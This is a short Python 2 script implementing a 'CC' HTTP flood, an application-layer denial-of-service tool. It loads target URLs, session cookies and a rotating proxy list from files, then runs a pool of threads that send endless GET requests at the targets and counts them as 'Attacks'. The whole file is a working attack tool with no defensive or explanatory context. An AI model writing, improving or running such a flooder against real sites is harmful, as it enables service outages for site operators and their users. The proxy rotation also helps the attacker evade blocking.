#! /usr/bin/env python
#! -*- coding: utf-8 -*-

import threadpool
import socket
import requests
import time
import random
import argparse

class CC(object):
    def __init__(self, tcount = 50, useproxy=False, timeout=3):
        self.count = 0
        self.tcount = tcount
        self.useproxy = useproxy
        self.timeout = timeout
        #self.data = self.readfile('data.txt')
        self.importurl()
        self.importcookie()
        if self.useproxy:
            self.importproxy()

    def importcookie(self):
        self.cookie = {}
        for i in self.readfile('cookie.txt').split(';'):
            t = i.strip().split('=')
            self.cookie[t[0]] = '='.join(t[1:])

    def importurl(self):
        self.url = []
        for i in self.readfile('url.txt').split('\n'):
            i = i.strip()
            if i == '':
                continue
            self.url.append(i)

    def importproxy(self):
        self.proxy = []
        for i in self.readfile('proxy.txt').split('\n'):
            if i.strip() == '':
                continue
            self.proxy.append({'http':'http://{0}/'.format(i.strip())})

    def readfile(self, fname):
        with open(fname, 'r') as f:
            return f.read()

    def get(self):
        '''
        s = socket.socket()
        s.settimeout(1)
        s.connect(('8.8.8.8', 80))
        s.send(self.data)
        s.recv(1)
        s.close()
        '''
        if self.useproxy:
            requests.get(random.choice(self.url), timeout=self.timeout, cookies=self.cookie, proxies=random.choice(self.proxy))
        else:
            requests.get(random.choice(self.url), timeout=self.timeout, cookies=self.cookie)
            
    def attack(self, x):
        while True:
            self.count = self.count + 1
            try:
                self.get()
            except Exception as e:
                #print e
                pass

    def run(self):
        pool = threadpool.ThreadPool(self.tcount)
        reqs = threadpool.makeRequests(self.attack, range(self.tcount))
        self.sttime = time.time()
        [pool.putRequest(req) for req in reqs]


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-o', '--timeout', type=float, default=3)
    parser.add_argument('-t', '--threadcount', type=int, default=50)
    parser.add_argument('-p', '--useproxy', action='store_true', default=False)
    args = parser.parse_args()
    cc = CC(args.threadcount, args.useproxy, args.timeout)
    cc.run()
    try:
        time.sleep(999999)
        raise(KeyboardInterrupt)
    except KeyboardInterrupt:
        print 
        print '[#] %d Attacks' % cc.count
        print '[#] cost %f seconds' % (time.time() - cc.sttime)
        time.sleep(1)
        exit()
